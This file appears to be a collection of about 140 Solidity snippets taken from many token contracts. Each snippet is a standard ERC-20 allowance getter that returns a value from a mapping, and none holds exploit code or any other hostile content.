<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="83" endline="85" pcid="2527">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="78" endline="80" pcid="6091">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="79" endline="81" pcid="7638">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="79" endline="81" pcid="7489">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="158" endline="164" pcid="5231">
    function allowance(address owner, address spender)
        public
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="149" endline="151" pcid="3940">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="75" endline="77" pcid="6987">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="77" endline="79" pcid="4109">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="80" endline="82" pcid="9131">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="77" endline="79" pcid="3551">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="76" endline="78" pcid="2067">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="76" endline="78" pcid="6306">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="76" endline="78" pcid="3458">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x88f233078cb6649576a6cbe8bd29a0a3811e5351.sol" startline="76" endline="78" pcid="5079">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="79" endline="81" pcid="2839">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="78" endline="80" pcid="309">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="74" endline="76" pcid="8616">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="75" endline="77" pcid="5736">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="75" endline="77" pcid="8993">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="79" endline="81" pcid="4334">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5a22929448bd37ec49ced7b63fe01e0edac652ef.sol" startline="56" endline="58" pcid="3400">
    function allowance(address owner, address spender) public view returns (uint) {
        return allowed[owner][spender];
    }
</source>
<source file="systems/source-code/0xAA2C33d58Ce20Efa76C1D131562e0c4177bc9E28.sol" startline="81" endline="83" pcid="6201">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="78" endline="80" pcid="5470">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe3294e522f9307592da7c9b290409772c6f89e5a.sol" startline="82" endline="84" pcid="8200">
    function getAllowance(address ownerAddr, address spender) public view returns (uint256) {
        return _allowances[ownerAddr][spender];
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="75" endline="77" pcid="6137">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2d11e3f0a7a3793f2211940d85cd3b48718c5e7a.sol" startline="58" endline="60" pcid="1347">
    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="73" endline="75" pcid="7218">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="76" endline="78" pcid="3958">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe30a4984a2520ddad1560292df4910f1970da26a.sol" startline="75" endline="77" pcid="8185">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="76" endline="78" pcid="5532">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="79" endline="81" pcid="1200">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="75" endline="77" pcid="7623">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="78" endline="80" pcid="3581">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x82f8c11f816693442b3a7d38cfba92abc7f356b0.sol" startline="62" endline="64" pcid="4916">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="75" endline="77" pcid="4304">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="79" endline="81" pcid="9146">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="79" endline="81" pcid="6957">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="74" endline="76" pcid="8396">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xCE641a63a438f15A3929C0A66b1428448ccfFaae.sol" startline="81" endline="83" pcid="7343">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="79" endline="81" pcid="1565">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="80" endline="82" pcid="2052">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="77" endline="79" pcid="5611">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="76" endline="78" pcid="836">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="78" endline="80" pcid="4608">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="77" endline="79" pcid="9161">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x50c69EB4BA27356A09110a622Deb2A7B9C58f6c4.sol" startline="75" endline="77" pcid="2993">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="79" endline="81" pcid="3105">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="76" endline="78" pcid="6076">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="75" endline="77" pcid="6540">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="256" endline="258" pcid="1980">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x187ecd1d7d930a356469551f7c71742ac2a7948d.sol" startline="78" endline="80" pcid="775">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="76" endline="78" pcid="5661">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="75" endline="77" pcid="7821">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x36Ce9629522814955bc7CE5eAC7313BDFB6AC136.sol" startline="268" endline="270" pcid="1805">
    function allowance(address account, address spender) external view returns (uint) {
        return allowances[account][spender];
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="78" endline="80" pcid="7474">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="75" endline="77" pcid="5766">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x460dad15a49c2738b3fc8cb5c7dcfa5d530847af.sol" startline="79" endline="81" pcid="2628">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="79" endline="81" pcid="6672">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="79" endline="81" pcid="6216">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="79" endline="81" pcid="3390">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="76" endline="78" pcid="1613">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x9adA335674982c21785141cb8bD6B1e0f9ac1FC4.sol" startline="78" endline="80" pcid="5646">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x44b5f46a20c2981d1bae28c3549365b9c6186931.sol" startline="54" endline="56" pcid="2552">
    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="79" endline="81" pcid="8913">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="77" endline="79" pcid="7961">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="76" endline="78" pcid="3776">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="77" endline="79" pcid="1223">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="77" endline="79" pcid="3008">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="78" endline="80" pcid="1007">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xd85C9321Bdb4D2Ff3b0De51fd17E71E9d64a0dA4.sol" startline="74" endline="76" pcid="7745">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="76" endline="78" pcid="4874">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="75" endline="77" pcid="4063">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="77" endline="79" pcid="7328">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="76" endline="78" pcid="8586">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="70" endline="72" pcid="2302">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="79" endline="81" pcid="8306">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2dae79a98c60696b65d591700dfeb9422ab2735c.sol" startline="60" endline="62" pcid="1354">
    function allowance(address owner, address spender) public view returns (uint256) {
        return allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="78" endline="80" pcid="5912">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="75" endline="77" pcid="8351">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="695" endline="697" pcid="6827">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="424" endline="426" pcid="3696">
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="77" endline="79" pcid="3651">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="79" endline="81" pcid="6613">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="72" endline="74" pcid="1628">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="76" endline="78" pcid="7931">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xCBf5E1478f1B77672a2684535D9aE9Fe1A7aBe5e.sol" startline="80" endline="82" pcid="7252">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="78" endline="80" pcid="3240">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="79" endline="81" pcid="264">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="78" endline="80" pcid="6765">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="165" endline="167" pcid="5126">
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="420" endline="422" pcid="7911">
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="78" endline="80" pcid="4079">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="81" endline="83" pcid="4593">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="80" endline="82" pcid="2406">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="79" endline="81" pcid="1833">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="80" endline="82" pcid="4003">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="77" endline="79" pcid="6366">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="77" endline="79" pcid="5188">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="73" endline="75" pcid="5034">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="78" endline="80" pcid="8534">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="76" endline="78" pcid="7608">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="78" endline="80" pcid="2269">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="80" endline="82" pcid="4744">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="77" endline="79" pcid="2803">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="79" endline="81" pcid="3488">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="79" endline="81" pcid="681">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="78" endline="80" pcid="8883">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="403" endline="405" pcid="9315">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="75" endline="77" pcid="7837">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="75" endline="77" pcid="4829">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x346708D8507D3114a1fa26E7f5E11aE1ba50dF2a.sol" startline="79" endline="81" pcid="1643">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0bdce6ba4c10f8e509b02382066e5402b97a7c80.sol" startline="1519" endline="1521" pcid="318">
    function allowance(address owner, address spender) public view returns (uint256) {
        return z[owner][spender];
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="81" endline="83" pcid="1867">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="76" endline="78" pcid="5881">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="82" endline="84" pcid="6106">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x13F986545Be7680E5832C88C3BC68a096B975949.sol" startline="77" endline="79" pcid="550">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="77" endline="79" pcid="6281">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="77" endline="79" pcid="6251">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="342" endline="344" pcid="8643">
    function allowance(address _holder, address _spender) public view returns (uint256) {
        return allowed[_holder][_spender];
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="78" endline="84" pcid="6485">
    function allowance(address owner, address spender)
        public
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="80" endline="82" pcid="5978">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="151" endline="153" pcid="374">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2e45211957ECDd650F0eAA42f6D58F03D58159e0.sol" startline="79" endline="81" pcid="1402">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="76" endline="78" pcid="8381">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="75" endline="77" pcid="1462">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="76" endline="78" pcid="6381">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="76" endline="78" pcid="294">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x70cf354cea658dc809b6f860d73d5a29088c19a6.sol" startline="41" endline="43" pcid="4144">
    function allowance(address owner, address spender) public view returns (uint256) {
        return z[owner][spender];
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="422" endline="424" pcid="8513">
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="78" endline="80" pcid="5254">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4701BD9e462012bC2A6D9e6aD71a132d7b64dF7d.sol" startline="76" endline="78" pcid="2675">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="77" endline="79" pcid="420">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="77" endline="79" pcid="177">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="79" endline="81" pcid="332">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="76" endline="78" pcid="3928">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="79" endline="81" pcid="2899">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="77" endline="79" pcid="5357">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="81" endline="83" pcid="5109">
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
</source>
